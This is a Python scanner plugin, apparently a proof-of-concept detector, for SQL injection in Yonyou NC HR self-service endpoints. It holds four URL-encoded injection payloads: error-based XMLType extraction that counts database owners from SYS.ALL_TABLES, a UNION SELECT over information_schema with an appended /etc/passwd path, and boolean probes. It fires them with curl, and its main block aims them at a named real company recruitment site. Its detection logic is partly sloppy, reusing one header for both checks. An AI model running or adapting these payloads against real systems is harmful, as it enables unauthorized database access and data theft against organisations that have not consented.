#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:range
#refer:http://www.wooyun.org/bugs/wooyun-2014-078679

import re

def assign(service, arg):
    if service == "yongyou_nc":
        return True, arg

def audit(arg):
    arg = arg.strip('/')
    payload1 = "/hrss/attach.download.d?appName=PSNBASDOC_RM&pkAttach=null%27%20AND%206046%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28REPLACE%28REPLACE%28REPLACE%28REPLACE%28%28SELECT%20NVL%28CAST%28COUNT%28OWNER%29%20AS%20VARCHAR%284000%29%29%2CCHR%2832%29%29%20FROM%20%28SELECT%20DISTINCT%28OWNER%29%20FROM%20SYS.ALL_TABLES%29%29%2CCHR%2832%29%2CCHR%28113%29%7C%7CCHR%28108%29%7C%7CCHR%28113%29%29%2CCHR%2836%29%2CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%2CCHR%2864%29%2CCHR%28113%29%7C%7CCHR%28100%29%7C%7CCHR%28113%29%29%2CCHR%2835%29%2CCHR%28113%29%7C%7CCHR%28102%29%7C%7CCHR%28113%29%29%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27GbdE%27%3D%27GbdE"
    payload2 = "/hrss/attach.download.d?appName=PSNBASDOC_RM&pkAttach=null&Ojtt%3D8516%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2C2%2C3%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%20..%2F..%2F..%2Fetc%2Fpasswd"
    payload3 = "/hrss/ref.show.d?refcode=HI000000000000000003%27%20AND%208684%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288684%3D8684%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28112%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27FrqA%27%3D%27FrqA"
    payload4 = "/hrss/ref.show.d?refcode=HI000000000000000003%27%29%20AND%208684%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288684%3D8684%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28112%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%27RJDF%27%3D%27RJDF"
    verify_url1 = arg + payload1
    verify_url2 = arg + payload2
    verify_url3 = arg + payload3
    verify_url4 = arg + payload4
    code1, head1, body, _, _ = curl.curl("%s" % verify_url1)
    code2, head2, body, _, _ = curl.curl("%s" % verify_url2)
    code3, head3, body, _, _ = curl.curl("%s" % verify_url3)
    code4, head4, body, _, _ = curl.curl("%s" % verify_url4)
    try:
        loc1 = re.search('Location: (.*)', head1).group(1)
        loc2 = re.search('Location: (.*)', head2).group(1)
        loc3 = re.search('Location: (.*)', head3).group(1)
        loc4 = re.search('Location: (.*)', head4).group(1)
        if code1 == 302 and "SQLException" in head1 and loc1 != loc2 and code2 == 302:
            security_hole("yonyou_nc injection: %s%s" % (arg, '/hrss/attach.download.d?appName=PSNBASDOC_RM&pkAttach=null'))
        if code1 == 302 and "Error" in head1 and loc1 != loc2 and code2 == 302:
            security_hole("yonyou_nc injection: %s%s" % (arg, '/hrss/ref.show.d?refcode=HI000000000000000003'))
    except:
        a = 1+1

if __name__ == '__main__':
    from dummy import *
    audit(assign('yongyou_nc', 'http://zhaopin.cnooc.com.cn/')[1])
